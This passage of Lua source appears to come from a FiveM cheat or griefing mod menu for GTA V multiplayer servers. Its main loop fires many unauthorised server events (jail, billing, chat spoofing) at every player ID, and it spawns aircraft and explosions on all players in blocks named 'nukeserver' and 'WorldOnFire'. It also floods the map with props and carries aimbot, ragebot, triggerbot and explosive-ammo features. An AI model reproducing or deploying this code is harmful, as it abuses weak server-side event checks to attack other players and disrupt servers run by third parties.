			SetVehicleNeonLightEnabled(veh, 0, true)
			SetVehicleNeonLightEnabled(veh, 1, true)
			SetVehicleNeonLightEnabled(veh, 2, true)
			SetVehicleNeonLightEnabled(veh, 3, true)
			SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), hO.r, hO.g, hO.b)
			SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), hO.r, hO.g, hO.b)
			SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), hO.r, hO.g, hO.b)
		end;
		if ou328hNeon then
			local hO = cP(1.0)
			local ped = PlayerPedId()
			local veh = GetVehiclePedIsUsing(ped)
			SetVehicleNeonLightEnabled(veh, 0, true)
			SetVehicleNeonLightEnabled(veh, 0, true)
			SetVehicleNeonLightEnabled(veh, 1, true)
			SetVehicleNeonLightEnabled(veh, 2, true)
			SetVehicleNeonLightEnabled(veh, 3, true)
			SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), hO.r, hO.g, hO.b)
		end;
		if Enable_Jail then
			i = 0, 450;
			do
				FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				FiveM.TriggerCustomEvent(false, "esx_jailler:sendToJail", GetPlayerServerId(i), 59999, "", 997)
				FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "", 300)
				FiveM.TriggerCustomEvent(false, "esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "")
				FiveM.TriggerCustomEvent(false, "esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "")
				FiveM.TriggerCustomEvent(false, "esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				FiveM.TriggerCustomEvent(false, "8321hiue89js", GetPlayerServerId(i), 5007, "", 32532532, securityToken)
				FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJailCatfrajerze", GetPlayerServerId(i), 300000, "", 500324532)
				FiveM.TriggerCustomEvent(false, "esx_jail:sendToJail", GetPlayerServerId(i), 5000, "")
				FiveM.TriggerCustomEvent(false, "js:jailuser", GetPlayerServerId(i), 5000, "")
				FiveM.TriggerCustomEvent(false, "wyspa_jail:jailPlayer", GetPlayerServerId(i), 300000, "", 500324532)
				FiveM.TriggerCustomEvent(false, "wyspa_jail:jail", GetPlayerServerId(i), 5000, "")
				FiveM.TriggerCustomEvent(false, "esx_policejob:billPlayer", GetPlayerServerId(i), 5000, "")
				FiveM.TriggerCustomEvent(false, "chatMessageEntered", "SYSTEM", {
					0,
					0,
					0
				}, GetPlayerName(PlayerId()) .. "")
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx-qalle-jail:updateJailTime", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "SERVER FREE PALESTINE")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "FREE PALESTINE")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, "FREE PALESTINE")
			end
		end;
		if co then
			Citizen.CreateThread(function()
				local hP = "Avenger"
				local hQ = "CARGOPLANE"
				local hR = "luxor"
				local hS = "maverick"
				local hT = "blimp2"
				while not HasModelLoaded(GetHashKey(hQ)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hQ))
				end;
				while not HasModelLoaded(GetHashKey(hR)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hR))
				end;
				while not HasModelLoaded(GetHashKey(hP)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hP))
				end;
				while not HasModelLoaded(GetHashKey(hS)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hS))
				end;
				while not HasModelLoaded(GetHashKey(hT)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hT))
				end;
				for i = 0, 128 do
					local hR = CreateVehicle(GetHashKey(hP), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hP), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hP), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(hQ), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hQ), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hQ), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(hR), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hR), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hR), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(hS), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hS), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hS), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(hT), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hT), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hT), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
				end
			end)
		end;
		if nukeserver then
			Citizen.CreateThread(function()
				local hU = "Avenger"
				local hV = "tula"
				local hW = "volatol"
				local hP = "maverick"
				local hQ = "bombushka"
				local hX = ""
				while not HasModelLoaded(GetHashKey(hV)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hV))
				end;
				while not HasModelLoaded(GetHashKey(hW)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hW))
				end;
				while not HasModelLoaded(GetHashKey(hU)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hU))
				end;
				while not HasModelLoaded(GetHashKey(hP)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hP))
				end;
				while not HasModelLoaded(GetHashKey(hQ)) do
					Citizen.Wait(0)
					RequestModel(GetHashKey(hQ))
				end;
				for hY = 0, 9 do
				end;
				for i = 0, 128 do
					local hW = CreateVehicle(GetHashKey(hU), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hU), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hU), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(hV), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hV), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hV), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(hW), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hW), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hW), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(hP), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hP), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hP), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and CreateVehicle(GetHashKey(hQ), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and CreateVehicle(GetHashKey(hQ), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and CreateVehicle(GetHashKey(hQ), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
				end;
				ShowInfo("~g~Fucked :(")
			end)
		end;
		if WorldOnFire then
			local pos = GetEntityCoords(PlayerPedId())
			local cP = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
			if cP ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
				local hZ = GetEntityCoords(cP)
				local x, y, z = table.unpack(hZ)
				local h_ = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x;
				local i0 = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y;
				local i1 = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z;
				AddExplosion(h_, i0, i1, 1, 1.0, 1, 0, 0.0)
				AddExplosion(h_, i0, i1, 4, 1.0, 1, 0, 0.0)
			end;
			for hA in EnumeratePeds() do
				if hA ~= PlayerPedId() then
					local hZ = GetEntityCoords(hA)
					local x, y, z = table.unpack(hZ)
					local h_ = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x;
					local i0 = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y;
					local i1 = math.random(math.floor(z), math.ceil(z + 1.5)) % z;
					AddExplosion(h_, i0, i1, 1, 1.0, 1, 0, 0.0)
					AddExplosion(h_, i0, i1, 4, 1.0, 1, 0, 0.0)
				end
			end
		end;
		if FuckMap then
			for i = -4000.0, 8000.0, 3.14159 do
				local av, i2 = GetGroundZFor_3dCoord(i, i, 0, 0)
				local av, i3 = GetGroundZFor_3dCoord(-i, i, 0, 0)
				local av, i4 = GetGroundZFor_3dCoord(i, -i, 0, 0)
				CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, i2, 0, 1, 1)
				CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, i3, 0, 1, 1)
				CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, i4, 0, 1, 1)
			end
		end;
		if ClearStreets then
			SetVehicleDensityMultiplierThisFrame(0.0)
			SetRandomVehicleDensityMultiplierThisFrame(0.0)
			SetParkedVehicleDensityMultiplierThisFrame(0.0)
			SetAmbientVehicleRangeMultiplierThisFrame(0.0)
			SetPedDensityMultiplierThisFrame(0.0)
		end;
		if RapidFire then
			eL()
		end;
		if Aimbot then
			if DrawFov then
				DrawRect(0.25, 0.5, 0.01, 0.515, 255, 80, 80, 100)
				DrawRect(0.75, 0.5, 0.01, 0.515, 255, 80, 80, 100)
				DrawRect(0.5, 0.25, 0.49, 0.015, 255, 80, 80, 100)
				DrawRect(0.5, 0.75, 0.49, 0.015, 255, 80, 80, 100)
			end;
			local ey = GetActivePlayers()
			for i = 1, #ey do
				fj(GetPlayerPed(ey[i]))
			end
		end;
		if Ragebot and IsDisabledControlPressed(0, cn["MOUSE1"]) then
			for cP in EnumeratePeds() do
				if cP ~= PlayerPedId() then
					fk(cP)
				end
			end
		end;
		function ShowCross(i5, x, y)
			RegisterFontFile('A9eelsh')
            fontId = RegisterFontId('A9eelsh')
            SetTextFont(fontId)
			SetTextProportional(1)
			SetTextScale(0.0, 0.4)
			SetTextDropshadow(1, 0, 0, 0, 255)
			SetTextEdge(1, 0, 0, 0, 255)
			SetTextDropShadow()
			SetTextOutline()
			SetTextEntry("STRING")
			AddTextComponentString(i5)
			DrawText(x, y)
		end;
		if Crosshair then
			ShowCross("+", 0.495, 0.484)
		end;
		if ShowCoords then
			local pos = GetEntityCoords(PlayerPedId())
			DrawTxt("~r~X:~w~ " .. round(pos.x, 3), 0.38, 0.03, 0.0, 0.4)
			DrawTxt("~r~Y:~w~ " .. round(pos.y, 3), 0.45, 0.03, 0.0, 0.4)
			DrawTxt("~r~Z:~w~ " .. round(pos.z, 3), 0.52, 0.03, 0.0, 0.4)
		end;
		if ExplosiveAmmo then
			local cR, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
			if cR then
				AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
			end
		end;
		if ForceGun then
			local cR, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
			if cR then
				for cP in EnumeratePeds() do
					local bs = GetEntityCoords(cP)
					if cP ~= PlayerPedId() and GetDistanceBetweenCoords(pos, bs) <= 1.0 then
						local ef = GetEntityForwardVector(PlayerPedId())
						RequestControlOnce(cP)
						ApplyForce(cP, ef * 500)
					end
				end;
				for cP in EnumerateVehicles() do
					local bs = GetEntityCoords(cP)
					if cP ~= GetVehiclePedIsIn(PlayerPedId(), 0) and GetDistanceBetweenCoords(pos, bs) <= 3.0 then
						local ef = GetEntityForwardVector(PlayerPedId())
						RequestControlOnce(cP)
						ApplyForce(cP, ef * 500)
					end
				end
			end
		end;
		if Triggerbot then
			local i6, by = GetEntityPlayerIsFreeAimingAt(PlayerId())
			if i6 and IsEntityAPed(by) then
				fe(by, "SKEL_HEAD")
			end
		end;
		local i7 = GetVehiclePedIsIn(PlayerPedId(), false)
		if IsPedInAnyVehicle(PlayerPedId()) then
			if driftMode then
				SetVehicleGravityAmount(i7, 5.0)
			elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
				SetVehicleGravityAmount(i7, 10.0)
			end
		end;
		if not gU then
			playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
			for cP in EnumerateVehicles() do
				SetEntityNoCollisionEntity(cP, playerveh, true)
			end;
			for cP in EnumerateObjects() do
				SetEntityNoCollisionEntity(cP, playerveh, true)
			end;
			for cP in EnumeratePeds() do
				SetEntityNoCollisionEntity(cP, playerveh, true)
			end
		end;
		if DeadlyBulldozer then
			SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
			SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
			if not IsPedInAnyVehicle(PlayerPedId(), 0) then
				DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
				DeadlyBulldozer = not DeadlyBulldozer
			elseif IsDisabledControlJustPressed(0, cn["E"]) then
				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
				local bs = GetEntityCoords(veh)
				local ef = GetEntityForwardVector(veh)
				local a2 = GetEntityHeading(veh)
				local veh = CreateVehicle(GetHashKey("BULLDOZER"), bs.x + ef.x * 10, bs.y + ef.y * 10, bs.z, a2, 1, 1)
				SetVehicleColours(veh, 27, 27)
				SetVehicleEngineHealth(veh, -3500.0)
				ApplyForce(veh, ef * 500.0)
			end
		end;
		if IhadSexWithMyStepMother.IsMenuOpened("objectlist") then
			for i = 1, #SpawnedObjects do
				local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
				DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
			end
		end;
		if NametagsEnabled then
			tags_plist = GetActivePlayers()
			for i = 1, #tags_plist do
				if NetworkIsPlayerTalking(tags_plist[i]) then
					SetMpGamerTagVisibility(ptags[i], 4, 1)
				else
					SetMpGamerTagVisibility(ptags[i], 4, 0)
				end;
				if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
					SetMpGamerTagVisibility(ptags[i], 8, 1)
				else
					SetMpGamerTagVisibility(ptags[i], 8, 0)
				end
			end
		end;
		if ANametagsEnabled then
			local ey = GetActivePlayers()
			table.removekey(ey, PlayerId())
			for i = 1, #ey do
				local pos = GetEntityCoords(GetPlayerPed(ey[i]))
				local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
				if distance <= 30 then
					if ANametagsNotNeedLOS then
						DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: " .. GetPlayerServerId(ey[i]) .. "\n~b~Name: " .. GetPlayerName(ey[i]))
					elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(ey[i]), 17) then
						DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: " .. GetPlayerServerId(ey[i]) .. "\n~b~Name: " .. GetPlayerName(ey[i]))
					end
				end
			end
		end;
		if LinesEnabled then
			local ey = GetActivePlayers()
			local i8 = GetEntityCoords(PlayerPedId())
			for i = 1, #ey do
				if i == PlayerId() then
					i = i + 1
				end;
				local bz = GetEntityCoords(GetPlayerPed(ey[i]))
				DrawLine(i8, bz, 0, 0, 255, 255)
			end
		end;
		if WeatherChanger then
			SetWeatherTypePersist(WeatherType)
			SetWeatherTypeNowPersist(WeatherType)
			SetWeatherTypeNow(WeatherType)
			SetOverrideWeather(WeatherType)
		end;
		if Radio then
			PortableRadio = true;
			SetRadioToStationIndex(RadioStation)
		elseif not Radio then
			PortableRadio = false
		end;
		if PortableRadio then
			SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), false)
			SetMobilePhoneRadioState(true)
			SetMobileRadioEnabledDuringGameplay(true)
			HideHudComponentThisFrame(16)
		elseif not PortableRadio then
			SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
			SetMobilePhoneRadioState(false)
			SetMobileRadioEnabledDuringGameplay(false)
			ShowHudComponentThisFrame(16)
			local i9 = GetPlayerRadioStationIndex()
			if IsPedInAnyVehicle(PlayerPedId(), false) and i9 + 1 ~= 19 then
				gD = i9 + 1;
				gE = i9 + 1
			end
		end;
		if ForceMap then
			DisplayRadar(true)
		end;
		if ForceThirdPerson then
			SetFollowPedCamViewMode(0)
			SetFollowVehicleCamViewMode(0)
		end;
		Wait(0)
	end
end)